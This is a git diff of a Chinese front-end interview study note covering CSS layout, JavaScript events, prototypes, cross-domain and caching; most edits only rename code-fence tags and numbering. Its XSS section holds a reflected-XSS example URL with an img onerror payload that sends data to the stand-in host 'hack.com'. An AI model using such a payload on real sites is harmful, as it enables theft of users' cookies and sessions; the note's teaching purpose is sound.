@@ -110,7 +110,7 @@ BFC 即 Block Formatting Contexts (块级格式化上下文)，它属于普通�
 
 #### BFC 特性及应用
 **1.同一个 BFC 下外边距会发生折叠**
-```javaScript
+```javascript
 <head>
 div{
     width: 100px;
@@ -131,7 +131,7 @@ div{
 从效果上看，因为两个 div 元素都处于同一个 BFC 容器下 (这里指 body 元素) 所以第一个 div 的下边距和第二个 div 的上边距发生了重叠，所以两个盒子之间距离只有 100px，而不是 200px。
 
 如果想要避免外边距的重叠，可以将其放在不同的 BFC 容器中。
-```javaScript
+```javascript
 <div class="container">
     <p></p>
 </div>
@@ -155,7 +155,7 @@ p {
 
 **2.BFC 可以包含浮动的元素（清除浮动）**
 我们都知道，浮动的元素会脱离普通文档流
-```javaScript
+```javascript
 <div style="border: 1px solid #000;">
     <div style="width: 100px;height: 100px;background: #eee;float: left;">
     </div>
@@ -165,7 +165,7 @@ p {
 
 由于容器内元素浮动，脱离了文档流，所以容器只剩下 2px 的边距高度。如果使触发容器的 BFC，那么容器将会包裹着浮动元素。
 
-```javaScript
+```javascript
 <div style="border: 1px solid #000;overflow: hidden">
     <div style="width: 100px;height: 100px;background: #eee;float: left;">
     </div>
@@ -178,7 +178,7 @@ p {
 **3. BFC 可以阻止元素被浮动元素覆盖**
 先来看一个文字环绕效果：
 
-```javaScript
+```javascript
 <div style="height: 100px;width: 100px;float: left;background: lightblue">我是一个左浮动的元素
 </div>
 <div style="width: 200px; height: 200px;background: #eee">我是一个没有设置浮动, 
@@ -194,7 +194,7 @@ p {
 
 
 ### 用纯CSS创建一个三角形
-```javaScript
+```javascript
 width: 0;
 height: 0;
 border-top: 40px solid transparent;
@@ -209,7 +209,7 @@ border-bottom: 40px solid #ff0000;
 
 
 ### 品字布局
-```javaScript
+```javascript
 		<style type="text/css">
 	
 			.container {
@@ -344,7 +344,7 @@ window -> document -> html -> body -> ... -> 目标元素
 #### event.currentTarget用来事件委托(事件代理)
 target事件委托的定义：本来该自己干的事，但是自己不干，交给别人来干。一般用到for循环遍历节点添加事件的时候都可以用事件委托来做，可以提高性能。
 
-```javaScript
+```javascript
 <input type="text" id="text">
     <input type="button" value="添加" id="button">
     <ul>
@@ -386,7 +386,7 @@ target事件委托的定义：本来该自己干的事，但是自己不干，�
 
 为什么在button.onclick里面也需要一个for循环，给每个删除按钮添加事件呢？因为外面的for循环，在文档刷新时给页面中存在的三个删除按钮添加了点击事件，而后来添加的删除按钮并没有绑定事件，导致页面中存在的三个li标签可以删除，而后来新添加的li不能删除这个问题。我们使用事件委托来做就不用这么麻烦了
 
-```javaScript
+```javascript
 <script>
             var button = document.getElementById("button");
             var text = document.getElementById("text");
@@ -424,7 +424,7 @@ target事件委托的定义：本来该自己干的事，但是自己不干，�
 
 
 ### 自定义事件
-```javaScript
+```javascript
 var eve = new Event('custome')
 
 element.addEventListener('custome',function(){
@@ -469,7 +469,7 @@ function A() {
 ![enter description here][6]
 
 举个栗子:
-```javaScript
+```javascript
     var obj = {};
     obj.a = 100;
     var arr = [];
@@ -488,7 +488,7 @@ function A() {
 
 ----------
 
-```javaScript
+```javascript
    // 构造函数
     function Foo(name, age) {
         this.name = name
@@ -511,7 +511,7 @@ function A() {
 ----------
 
 
-```javaScript
+```javascript
     //动物
     function Animal() {
         this.eat = function () {
@@ -555,7 +555,7 @@ o3本身自己是空对象，并没有name属性**
 Object.create 创建的对象是用原型链来连接的
 
 Object.create的实现方式：
-```javaScript
+```javascript
 Object.create =  function (o) {
     var F = function () {};
     F.prototype = o;
@@ -568,7 +568,7 @@ Object.create =  function (o) {
 可以看出来。Object.create是内部定义一个对象，并且让F.prototype对象 赋值为引进的对象/函数 o，并return出一个新的对象。
 
 简单实现new:
-```javaScript
+```javascript
 var new2 = function(func){
     var o = Object.create(func.prototype)
     var k = func.call(o) //转移上下文 this指向o实例
@@ -583,7 +583,7 @@ var new2 = function(func){
 
 ### instanceof和constructor
 用到instanceof和constructor来检测某个对象是不是另一个对象的实例
-```javaScript
+```javascript
 var M = function(name){
     this.name = name
 }
@@ -606,7 +606,7 @@ o3.\_\_proto__.constructor === Object //false**
 
 
 ### 借助构造函数实现继承
-```javaScript
+```javascript
 function Parent1(){
     this.name = 'parent1'
 }
@@ -622,7 +622,7 @@ console.log(Child1())
 
 
 ### 借助原型链实现继承
-```javaScript
+```javascript
 function Parent2(){
     this.name = 'parent2'
     this.play = [1,2,3]
@@ -634,7 +634,7 @@ Child2.prototype = new Parent2()
 ```
 
 
-```javaScript
+```javascript
 var s1 = new Child2()
 var s2 = new Child2()
 s1.play.push(4)
@@ -644,7 +644,7 @@ s1.play.push(4)
 **缺点：子类共用原型链中的原型对象**
 
 ### 借助组合方式实现继承
-```javaScript
+```javascript
 function Parent3(){
     this.name = 'parent3'
     this.play = [1,2,3]
@@ -659,7 +659,7 @@ Child3.prototype = new Parent3()
 
 
 组合继承优化1：
-```javaScript
+```javascript
 function Parent4(){
     this.name = 'parent4'
     this.play = [1,2,3]
@@ -671,7 +671,7 @@ function Child4(){
 Child4.prototype = Parent4.prototype
 ```
 
-```javaScript
+```javascript
 var s5 = new Child4()
 var s6 = new Child4()
 console.log(s5 instanceof Child4,s5 instanceof Parent4)
@@ -681,7 +681,7 @@ console.log(s5 instanceof Child4,s5 instanceof Parent4)
 
 
 组合继承优化2：
-```javaScript
+```javascript
 function Parent5(){
     this.name = 'parent5'
     this.play = [1,2,3]
@@ -721,7 +721,7 @@ Child5.prototype.constructor = Child5
 * 事件的触发条件
 * 事件的触发顺序
 
-```javaScript
+```javascript
   var xhr = new XMLHttpRequest();
     xhr.open("GET", "/api", false);
     xhr.onreadystatechange = function () {
@@ -749,10 +749,10 @@ Child5.prototype.constructor = Child5
 * 5xx 服务器端错误
 
 ### JSONP简单实现
-[代码地址](https://github.com/QinZhen001/front-end-demo/blob/master/cross-domain/jsonp.js)
+[代码地址]()
 
 ### 跨域通信
-[代码地址](https://github.com/QinZhen001/front-end-demo/blob/master/cross-domain/cross-domain.html)
+[代码地址]()
 * JSONP(利用script标签的异步加载)
 * Hash(hash改变页面不会刷新)
 * postMessage
@@ -767,7 +767,7 @@ postMessage是html5新增的一个解决跨域的一个方法
 postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。
 
 我们拿跨域中的iframe做例子
-```javaScript
+```javascript
 <script type="text/javascript">
     window.parent.postMessage('hello world','*');   
     //在被嵌套的iframe的页面中写入这样一段代码
@@ -778,7 +778,7 @@ postMessage()方法允许来自不同源的脚本采用异步方式进行有限�
 
 
 注意：postMessage的写法，postMessage之前写的是你要通信的window对象（也就是你要像谁通信），此时的window.parent的权限仅限于此，不能在像同域似的，进行获取父级的DOM元素，否则浏览器会报错，提示你不能进行跨域访问，我们再来看postMessage中所接收的参数，第一个参数就是你要像另外一个窗口传递的数据（只能传字符串类型），第二个参数表示目标窗口的源，协议+主机+端口号，是为了安全考虑，如果设置为“*”，则表示可以传递给任意窗口。
-```javaScript
+```javascript
 <script type="text/javascript">
     window.addEventListener('message',function(e){
         console.log(e.data);        //hello world
@@ -877,7 +877,7 @@ XSS往往在“查询”部分发现漏洞构造攻击代码实施攻击，所�
 
 **构造攻击代码：**
 hacker在发现站点对应的漏洞之后，基本可以确定是使用“反射型”或者“存储型”。对于反射型这个很简单了，执行类似代码：
-```javaScript
+```javascript
 https://www.toutiao.com/search?item=<img onerror="new Image().src='//hack.com?c=' src='null'>"
 ```
 
@@ -988,7 +988,7 @@ DocumentFragment 接口表示一个没有父级文件的最小文档对象。它
 
 
 #### 合并DOM插入
-```javaScript
+```javascript
     var listNode = document.getElementById('list');
     var frag = document.createDocumentFragment();
     var x, li;
@@ -1000,7 +1000,7 @@ DocumentFragment 接口表示一个没有父级文件的最小文档对象。它
     listNode.appendChild(frag);
 ```
 #### 事件节流
-```javaScript
+```javascript
     var textarea = document.getElementById('text');
     var timeoutId;
     textarea.addEventListener('keyup', function () {
@@ -1013,7 +1013,7 @@ DocumentFragment 接口表示一个没有父级文件的最小文档对象。它
     })
 ```   
 #### 尽早操作
-```javaScript
+```javascript
     window.addEventListener('load', function () {
         // 页面的全部资源加载完才会执行，包括图片，视频等
     });
@@ -1060,26 +1060,26 @@ JavaScript是在浏览器执行的语言， 是因为它有BOM和DOM，前者提
 100 == ‘100’ //true 
 0 == ‘’ //true 
 null == undefined //true
-```javaScript
+```javascript
 if(obj.a == null){ // 这里相当于obj.a === null || obj.a === undefined 的简写形式 // 这是jquery源码中的推荐写法 }
 ```
 
 
 ### 如何理解JSON
 JSON只不过是一个JS对象而已
-```javaScript
+```javascript
 JSON.stringify({a:10,b:20}) 
 JSON.parse(‘{“a”:10,”b”:20}’)
 ```
 
 ### 判断一个变量会被当作true还是false
-```javaScript
+```javascript
 var a = 100 
 console.log(!!a)
 ```
 
 ### 如何准确判断一个变量是数组类型
-```javaScript
+```javascript
 var arr = [];
 console.log(arr instanceof Array); //true
 console.log(typeof arr);//object,typeof是无法判断是否是数组的
@@ -1102,7 +1102,7 @@ console.log(typeof arr);//object,typeof是无法判断是否是数组的
 
 
 #### 数组 sort
-```javaScript
+```javascript
     var arr = [1, 2, 3, 4, 5];
     var arr2 = arr.sort(function (a, b) {
         //从小到大
@@ -1114,7 +1114,7 @@ console.log(typeof arr);//object,typeof是无法判断是否是数组的
     });
 ```    
 #### 数组 map
-```javaScript
+```javascript
     var arr = [1, 2, 3, 4];
     var arr2 = arr.map(function (item, index, array) {
         //将元素重新组装，并返回
@@ -1122,7 +1122,7 @@ console.log(typeof arr);//object,typeof是无法判断是否是数组的
     });
 ```
 #### 数组 filter
-```javaScript
+```javascript
     var arr = [1,2,3]
     var arr2 = arr.filter(function (item,index) {
         // 通过某个条件过滤数组
@@ -1133,7 +1133,7 @@ console.log(typeof arr);//object,typeof是无法判断是否是数组的
     })
 ```    
 ### 写一个能遍历对象和数组的forEach函数
-```javaScript
+```javascript
 function forEach(obj,fn) {
     var key
     if(obj instanceof Array){
@@ -1157,7 +1157,7 @@ function forEach(obj,fn) {
 
 
 ### location
-```javaScript
+```javascript
 console.log(location.href); //http://localhost:63342/untitled2/test.html?_ijt=qgpv4jmr3aio5urdkukkjtts47
 console.log(location.protocol); //http:
 console.log(location.pathname); ///test/abc.html(本地位置)
@@ -1170,7 +1170,7 @@ console.log(location.hash);
 
 
 ### 通用事件绑定
-```javaScript
+```javascript
  function bindEvent(elem, type, fn) {
         elem.addEventListener(type, fn);
     }
@@ -1204,7 +1204,7 @@ console.log(location.hash);
 
 
 ### navigator & screen
-```javaScript
+```javascript
 // navigator
     var ua = navigator.userAgent;
     var isChrome = ua.indexOf('Chrome');
@@ -1222,7 +1222,7 @@ console.log(location.hash);
 
 
 
-```javaScript
+```javascript
 console.log('A')
 while(true){
 
@@ -1277,7 +1277,7 @@ console.log('B')
 
 
 **执行栈中的代码（同步任务），总是在读取"任务队列"（异步任务）之前执行**。请看下面这个例子。
-```javaScript
+```javascript
  var req = new XMLHttpRequest();
     req.open('GET', url);    
     req.onload = function (){};    
@@ -1288,7 +1288,7 @@ console.log('B')
 上面代码中的req.send方法是Ajax操作向服务器发送数据，它是一个异步任务，意味着只有当前脚本的所有代码执行完，系统才会去读取"任务队列"。所以，它与下面的写法等价。
 
 
-```javaScript
+```javascript
  var req = new XMLHttpRequest();
     req.open('GET', url);
     req.send();
@@ -1319,12 +1319,13 @@ console.log('B')
 3. async
 
 
-```javaScript
+```javascript
 <script src="xxx.js" defer></script>		
 ```
 
-```javaScript
-<script src="xxx.js" async></script>	
+
+```javascript
+<script src="xxx.js" async></script>
 ```
 
 异步加载的区别：
@@ -1361,21 +1362,21 @@ console.log('B')
 
 
 **简单介绍下Cache-Control的属性设置:**
-1. max-age: 设置缓存的最大的有效时间，单位为秒（s）。max-age会覆盖掉Expires
-2. s-maxage: 只用于共享缓存，比如CDN缓存（s -> share）。与max-age 的区别是：max-age用于普通缓存，
+1) max-age: 设置缓存的最大的有效时间，单位为秒（s）。max-age会覆盖掉Expires
+2) s-maxage: 只用于共享缓存，比如CDN缓存（s -> share）。与max-age 的区别是：max-age用于普通缓存，
 而s-maxage用于代理缓存。如果存在s-maxage,则会覆盖max-age 和 Expires.
-3. public：响应会被缓存，并且在多用户间共享。默认是public。
-4. private: 响应只作为私有的缓存，不能在用户间共享。如果要求HTTP认证，响应会自动设置为private。
-5. no-cache: 指定不缓存响应，表明资源不进行缓存。但是设置了no-cache之后并不代表浏览器不缓存，而是在缓存前要向服务器确认资源是否被更改。因此有的时候只设置no-cache防止缓存还是不够保险，还可以加上private指令，将过期时间设为过去的时间。
-6. no-store: 绝对禁止缓存。
-7. must-revalidate: 如果页面过期，则去服务器进行获取。
+3) public：响应会被缓存，并且在多用户间共享。默认是public。
+4) private: 响应只作为私有的缓存，不能在用户间共享。如果要求HTTP认证，响应会自动设置为private。
+5) no-cache: 指定不缓存响应，表明资源不进行缓存。但是设置了no-cache之后并不代表浏览器不缓存，而是在缓存前要向服务器确认资源是否被更改。因此有的时候只设置no-cache防止缓存还是不够保险，还可以加上private指令，将过期时间设为过去的时间。
+6) no-store: 绝对禁止缓存。
+7) must-revalidate: 如果页面过期，则去服务器进行获取。
 
 ![enter description here][10]
 
 
 
-1. 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期
-2. 查看是否有cache-control 的max-age / s-maxage，没有，则用expires 作为过期时间比较
+1) 查看是否有cache-control 的max-age / s-maxage , 如果有，则用服务器时间date值 + max-age/s-maxage 的秒数计算出新的过期时间，将当前时间与过期时间进行比较，判断是否过期
+2) 查看是否有cache-control 的max-age / s-maxage，没有，则用expires 作为过期时间比较
 
 ![enter description here][11]
 
@@ -1425,7 +1426,7 @@ console.log('B')
 3. Error事件捕获
 
 
-```javaScript
+```javascript
 Error事件捕获
 
 window.addEventListener('error',function(e){
@@ -1443,7 +1444,7 @@ window.addEventListener('error',function(e){
 2. **利用Image对象上报**
 
 
-```javaScript
+```javascript
 利用Image对象上报
 
 
@@ -1467,7 +1468,7 @@ window.addEventListener('error',function(e){
 
 
 ### 快速排序
-```javaScript
+```javascript
 var quickSort = function(arr) {
     if (arr.length <= 1) { return arr; }
     var pivotIndex = Math.floor(arr.length / 2);   //基准位置（理论上可任意选取）
@@ -1492,7 +1493,7 @@ var quickSort = function(arr) {
 
 
 ### 希尔排序
-```javaScript
+```javascript
 function selectionSort(arr) {
     var len = arr.length;
     var minIndex, temp;
